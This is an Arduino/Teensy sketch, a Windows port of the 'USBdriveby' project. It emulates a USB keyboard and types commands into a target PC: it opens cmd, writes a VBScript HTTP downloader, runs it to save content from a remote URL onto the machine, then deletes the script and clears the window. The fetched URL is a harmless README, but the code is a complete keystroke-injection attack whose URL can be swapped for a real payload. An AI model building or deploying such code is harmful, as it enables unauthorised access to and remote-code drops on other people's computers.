
// USBdriveby Windows version by FFY00 (Filipe Laíns)
// Based on Samy Kamkar work
// https://github.com/samyk/usbdriveby
// And stack overflow question about content downloading
// https://stackoverflow.com/questions/36828964/download-web-content-through-cmd

// Simulates a HID keyboard and makes call to web resorce, afer that saves it to output file on target machine
// Tested on Windows 7

// Resource url
#define RESOURCE_URL "https://raw.githubusercontent.com/sapran/dontclickshit/master/README_EN.md"
// Output file name
#define OUTPUT_FILE_NAME "dont_click_shit.txt" 
const unsigned int ledPin = 13;
const unsigned int delayTime = 1500;

void setup()
{
  delay(1000);

  // Setup LED
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  waitForDrivers();

  // Download content from web
  pwn();
}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void waitForDrivers()
{
    while (!(keyboard_leds & 2))
    {
        key(KEY_CAPS_LOCK, 0);
    }
    if (keyboard_leds & 2)
    {
        key(KEY_CAPS_LOCK, 0);
    }
}


void pwn()
{
  openapp("cmd");
  Keyboard.println("cd Desktop");
  Keyboard.println("echo.>Filter.vbs");
  Keyboard.println("notepad Filter.vbs");
  
  delay(delayTime);
  Keyboard.println("Set Arg = WScript.Arguments");
  Keyboard.println("set WshShell = createObject(\"Wscript.Shell\")");
  Keyboard.println("Set Inp = WScript.Stdin");
  Keyboard.println("Set Outp = Wscript.Stdout");
  Keyboard.println("On Error Resume Next");
  Keyboard.println("    Set File = WScript.CreateObject(\"Microsoft.XMLHTTP\")");
  Keyboard.println("    File.Open \"GET\", Arg(1), False");
  Keyboard.println("    File.setRequestHeader \"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C; .NET4.0E; BCD2000; BCD2000)\"");
  Keyboard.println("    File.Send");
  Keyboard.println("    txt=File.ResponseText");
  Keyboard.println("    'Putting in line endings");
  Keyboard.println("    Outp.write txt");
  Keyboard.println("    If err.number <> 0 then");
  Keyboard.println("      Outp.writeline \"\"");
  Keyboard.println("      Outp.writeline \"Error getting file\"");
  Keyboard.println("      Outp.writeline \"==================\"");
  Keyboard.println("      Outp.writeline \"\"");
  Keyboard.println("      Outp.writeline \"Error \" & err.number & \"(0x\" & hex(err.number) & \") \" & err.description");
  Keyboard.println("      Outp.writeline \"Source \" & err.source");
  Keyboard.println("      Outp.writeline \"\"");
  Keyboard.println("      Outp.writeline \"HTTP Error \" & File.Status & \" \" & File.StatusText");
  Keyboard.println("      Outp.writeline  File.getAllResponseHeaders");
  Keyboard.println("      Outp.writeline LCase(Arg(1))");
  Keyboard.println("    End If");
  key(KEY_F4, MODIFIERKEY_ALT);
  delay(delayTime/5);
  key(KEY_ENTER, 0);
  delay(delayTime);

  Keyboard.print("notepad.>");
  Keyboard.println(OUTPUT_FILE_NAME);
  Keyboard.print("cscript Filter.vbs web ");
  Keyboard.print(RESOURCE_URL);
  Keyboard.print(" > ");
  Keyboard.println(OUTPUT_FILE_NAME);
  delay(delayTime);
  Keyboard.println("del Filter.vbs");
  Keyboard.print("notepad ");
  Keyboard.print(OUTPUT_FILE_NAME);
  Keyboard.println(" & exit");
  key(KEY_ENTER, 0);

  key(KEY_SPACE, MODIFIERKEY_ALT);
  delay(delayTime/10);
  key(KEY_C, 0);
}

void loop()
{
  // Blink -> IT'S DONE
  digitalWrite(ledPin, HIGH);
  delay(80);
  digitalWrite(ledPin, LOW);
  delay(80);
}
